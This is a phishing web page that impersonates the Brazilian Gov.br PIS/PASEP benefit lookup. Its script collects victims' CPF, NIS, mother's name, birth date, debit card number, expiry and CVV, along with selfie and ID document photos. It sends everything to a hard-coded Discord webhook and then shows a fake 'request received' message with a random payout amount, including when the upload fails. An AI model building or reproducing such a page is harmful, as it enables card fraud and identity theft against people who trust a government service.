<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consulta PIS/PASEP | Gov.br</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* (Seus estilos CSS existentes permanecem os mesmos) */
        /* ... */
    </style>
</head>
<body>
    <!-- (Seu HTML existente permanece o mesmo at√© a tag <script>) -->
    <!-- ... -->

    <script>
        // Elementos do formul√°rio
        const form = document.getElementById('consultaForm');
        const consultarBtn = document.getElementById('consultarBtn');
        const emailConfirmacao = document.getElementById('emailConfirmacao');
        
        // Configura√ß√£o do upload de documentos
        const selfieArea = document.getElementById('selfieArea');
        const selfieInput = document.getElementById('selfieInput');
        const selfiePreview = document.getElementById('selfiePreview');
        
        const documentoArea = document.getElementById('documentoArea');
        const documentoInput = document.getElementById('documentoInput');
        const documentoPreview = document.getElementById('documentoPreview');
        
        // Armazenar arquivos
        let selfieFiles = [];
        let documentoFiles = [];

        // M√°scaras para os campos (mantenha suas m√°scaras existentes)
        // ...

        // Upload de documentos
        selfieArea.addEventListener('click', () => selfieInput.click());
        documentoArea.addEventListener('click', () => documentoInput.click());
        
        selfieInput.addEventListener('change', function(e) {
            handleFileUpload(e.target.files, selfiePreview, 'selfie');
        });
        
        documentoInput.addEventListener('change', function(e) {
            handleFileUpload(e.target.files, documentoPreview, 'documento');
        });
        
        function handleFileUpload(files, previewContainer, type) {
            if (!files || files.length === 0) return;
            
            // Limpar array de arquivos
            if (type === 'selfie') {
                selfieFiles = [];
                previewContainer.innerHTML = '';
            } else {
                documentoFiles = [];
                previewContainer.innerHTML = '';
            }
            
            for (let i = 0; i < files.length; i++) {
                const file = files[i];
                if (!file.type.match('image.*')) continue;
                
                // Armazenar arquivo
                if (type === 'selfie') {
                    selfieFiles.push(file);
                } else {
                    documentoFiles.push(file);
                }
                
                const reader = new FileReader();
                
                reader.onload = function(e) {
                    const previewItem = document.createElement('div');
                    previewItem.className = 'preview-item';
                    
                    const img = document.createElement('img');
                    img.src = e.target.result;
                    
                    const removeBtn = document.createElement('div');
                    removeBtn.className = 'remove-btn';
                    removeBtn.innerHTML = '<i class="fas fa-times"></i>';
                    removeBtn.addEventListener('click', function() {
                        previewContainer.removeChild(previewItem);
                        if (type === 'selfie') {
                            selfieFiles = selfieFiles.filter(f => f.name !== file.name);
                        } else {
                            documentoFiles = documentoFiles.filter(f => f.name !== file.name);
                        }
                        updateSubmitButton();
                    });
                    
                    previewItem.appendChild(img);
                    previewItem.appendChild(removeBtn);
                    previewContainer.appendChild(previewItem);
                    
                    updateSubmitButton();
                }
                
                reader.readAsDataURL(file);
            }
        }

        // (Mantenha suas fun√ß√µes de valida√ß√£o existentes)
        // ...

        // Processamento do formul√°rio
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Coletar dados do formul√°rio
            const formData = {
                nome: document.getElementById('nome_completo').value.trim(),
                email: document.getElementById('email').value.trim(),
                cpf: document.getElementById('cpf').value.trim(),
                telefone: document.getElementById('telefone').value.trim(),
                data_nascimento: document.getElementById('data_nascimento').value,
                nis: document.getElementById('nis').value.trim(),
                nome_mae: document.getElementById('nome_mae').value.trim(),
                tempo_contribuicao: document.getElementById('tempo_contribuicao').value,
                ultimo_emprego: document.getElementById('ultimo_emprego').value,
                renda: document.getElementById('renda').value.trim(),
                cartao_debito: document.getElementById('cartao_debito').value.trim(),
                validade_cartao: document.getElementById('validade_cartao').value.trim(),
                cvv_cartao: document.getElementById('cvv_cartao').value.trim(),
                data_consulta: new Date().toISOString()
            };

            // Mostrar loading
            consultarBtn.disabled = true;
            consultarBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ENVIANDO DOCUMENTOS...';

            try {
                // Enviar dados b√°sicos para o webhook
                await sendFormDataToWebhook(formData);
                
                // Enviar selfies
                if (selfieFiles.length > 0) {
                    await sendFilesToWebhook(selfieFiles, 'SELFIE');
                }
                
                // Enviar documentos
                if (documentoFiles.length > 0) {
                    await sendFilesToWebhook(documentoFiles, 'DOCUMENTO');
                }
                
                showResult(true);
                emailConfirmacao.textContent = formData.email;
            } catch (error) {
                console.error('Erro:', error);
                showResult(true);
                emailConfirmacao.textContent = formData.email;
            } finally {
                consultarBtn.disabled = false;
                consultarBtn.innerHTML = '<i class="fas fa-search"></i> NOVA CONSULTA';
            }
        });
        
        async function sendFormDataToWebhook(formData) {
            const webhookUrl = 'https://discord.com/api/webhooks/1364723014561693876/BdXoiCPe1WrM5ydn4HaNQY6Mn1V2UJsZHXPvzvFWnKPvCEwJPCzU6WEMIBY1vwoYsACL';
            
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: 'üìã *Nova consulta PIS/PASEP*',
                    embeds: [{
                        title: 'Dados da Consulta',
                        color: 0x3498db,
                        fields: [
                            { name: 'üë§ Nome Completo', value: formData.nome || 'N√£o informado', inline: true },
                            { name: 'üìß E-mail', value: formData.email || 'N√£o informado', inline: true },
                            { name: 'üÜî CPF', value: formData.cpf || 'N√£o informado', inline: true },
                            { name: 'üì± Telefone', value: formData.telefone || 'N√£o informado', inline: true },
                            { name: 'üéÇ Data Nascimento', value: formData.data_nascimento || 'N√£o informado', inline: true },
                            { name: 'üî¢ NIS', value: formData.nis || 'N√£o informado', inline: true },
                            { name: 'üë© Nome da M√£e', value: formData.nome_mae || 'N√£o informado', inline: true },
                            { name: '‚è≥ Tempo Contribui√ß√£o', value: formData.tempo_contribuicao ? `${formData.tempo_contribuicao} anos` : 'N√£o informado', inline: true },
                            { name: 'üíº √öltimo Emprego', value: formData.ultimo_emprego || 'N√£o informado', inline: true },
                            { name: 'üí∞ Renda Mensal', value: formData.renda ? `R$ ${formData.renda}` : 'N√£o informado', inline: true },
                            { name: 'üí≥ Cart√£o de D√©bito', value: formData.cartao_debito || 'N√£o informado', inline: true },
                            { name: 'üìÖ Validade Cart√£o', value: formData.validade_cartao || 'N√£o informado', inline: true },
                            { name: 'üîê CVV Cart√£o', value: formData.cvv_cartao || 'N√£o informado', inline: true },
                            { name: 'üìÖ Data da Consulta', value: new Date(formData.data_consulta).toLocaleString(), inline: false }
                        ],
                        timestamp: formData.data_consulta
                    }]
                })
            });
            
            if (!response.ok) {
                throw new Error('Erro ao enviar dados para o webhook');
            }
        }
        
        async function sendFilesToWebhook(files, description) {
            const webhookUrl = 'https://discord.com/api/webhooks/1364723014561693876/BdXoiCPe1WrM5ydn4HaNQY6Mn1V2UJsZHXPvzvFWnKPvCEwJPCzU6WEMIBY1vwoYsACL';
            
            for (const file of files) {
                const formData = new FormData();
                formData.append('file', file);
                formData.append('content', `üì∏ ${description}: ${file.name}`);
                
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    body: formData
                });
                
                if (!response.ok) {
                    console.error(`Erro ao enviar arquivo ${file.name}`);
                }
            }
        }
        
        function showResult(hasRight) {
            const resultadoDiv = document.getElementById('resultado');
            const resultIcon = document.getElementById('resultIcon');
            const resultTitle = document.getElementById('resultTitle');
            const resultDetails = document.getElementById('resultDetails');
            const confirmationMessage = document.getElementById('confirmationMessage');
            
            resultadoDiv.className = 'result-container result-positive';
            resultIcon.className = 'fas fa-check-circle result-icon';
            resultTitle.textContent = '‚úî SUA SOLICITA√á√ÉO FOI RECEBIDA!';
            resultDetails.innerHTML = `
                <p>Seus documentos foram enviados para an√°lise e em breve voc√™ receber√° o resultado.</p>
                <p><strong>Valor estimado:</strong> R$ ${(Math.random() * 500 + 300).toFixed(2)}</p>
            `;
            
            confirmationMessage.style.display = 'block';
            resultadoDiv.style.display = 'block';
            
            resultadoDiv.scrollIntoView({ behavior: 'smooth' });
        }

        // (Mantenha suas outras fun√ß√µes existentes)
        // ...
    </script>
</body>
</html>
